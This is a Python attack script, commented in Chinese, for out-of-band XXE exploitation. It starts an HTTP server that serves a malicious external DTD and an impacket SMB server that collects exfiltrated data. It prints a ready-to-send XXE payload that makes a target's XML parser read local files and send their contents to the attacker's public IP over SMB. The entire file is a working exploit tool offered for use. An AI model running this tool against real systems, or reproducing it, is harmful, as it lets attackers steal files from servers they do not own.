#!/usr/bin/env python3
from impacket.smbserver import SimpleSMBServer
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
import os
import logging
import threading
import argparse


class XXEHandler(BaseHTTPRequestHandler):
    
    public_ip = None
    
    def do_GET(self):
        """处理所有 GET 请求"""
        self.send_response(200)
        self.send_header('Content-type', 'application/xml')
        self.end_headers()
        
        # 构造 XXE payload
        payload = f'<!ENTITY % all "<!ENTITY send SYSTEM \'file:////{self.public_ip}/a%file;\'>">\n%all;'
        
        self.wfile.write(payload.encode())
        
        # 记录请求
        logging.info(f"[HTTP] Request from {self.address_string()} - Path: {self.path}")
        logging.info(f"[HTTP] Sent payload: {payload}")
    
    
    def log_message(self, format, *args):
        """自定义日志格式"""
        logging.info(f"[HTTP] {self.address_string()} - {format % args}")


def start_http_server(port, public_ip):
    """启动 HTTP 服务器"""
    XXEHandler.public_ip = public_ip
    server = HTTPServer(('0.0.0.0', port), XXEHandler)
    logging.info(f"[*] HTTP Server started on port {port}")
    logging.info(f"[*] XXE Payload URL: http://{public_ip}:{port}/xxe.dtd")
    server.serve_forever()


def start_smb_server(share_path):
    """启动 SMB 服务器"""
    server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
    server.addShare('SHARE', share_path, '')
    server.setSMBChallenge('')
    server.setSMB2Support(True)
    server.start()


def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(
        description='XXE SMB Server - Combined HTTP and SMB server for XXE exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
        Examples:
        %(prog)s 1.2.3.4              # 使用默认 HTTP 端口 80
        %(prog)s 1.2.3.4 8080         # 使用自定义 HTTP 端口 8080
        ''')
    
    parser.add_argument('public_ip', 
                        help='公网 IP 地址 (必需)')
    parser.add_argument('webport', 
                        type=int, 
                        nargs='?', 
                        default=80,
                        help='HTTP 服务端口 (默认: 80)')
    parser.add_argument('-s', '--share-path',
                        default='/tmp/share',
                        help='SMB 共享目录路径 (默认: /tmp/share)')
    
    args = parser.parse_args()
    
    # 验证 IP 地址格式（简单验证）
    if not args.public_ip or args.public_ip.count('.') != 3:
        parser.error("请提供有效的公网 IP 地址")
    
    # 自动创建共享目录
    os.makedirs(args.share_path, exist_ok=True)
    
    # 配置详细日志输出
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # 设置 impacket 相关模块的日志级别
    logging.getLogger('impacket.smbserver').setLevel(logging.DEBUG)
    payload = f'''Usage:
  1. 请发送如下XXE payload到目标服务器 
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///">
  <!ENTITY % dtd SYSTEM "http://{args.public_ip}:{args.webport}/data.dtd"> %dtd;
  ]>
  <data>&send;</data>
  2. SMB 服务器将捕获文件内容'''
    print(payload)
    
    try:
        # 在单独的线程中启动 HTTP 服务器
        http_thread = threading.Thread(
            target=start_http_server, 
            args=(args.webport, args.public_ip),
            daemon=True
        )
        http_thread.start()
        
        # 在主线程中启动 SMB 服务器
        start_smb_server(args.share_path)
        
    except KeyboardInterrupt:
        print("\n[*] Servers stopped")
        sys.exit(0)
    except PermissionError:
        print("\n[!] Error: Permission denied. Please run with sudo for port 445 and port 80")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
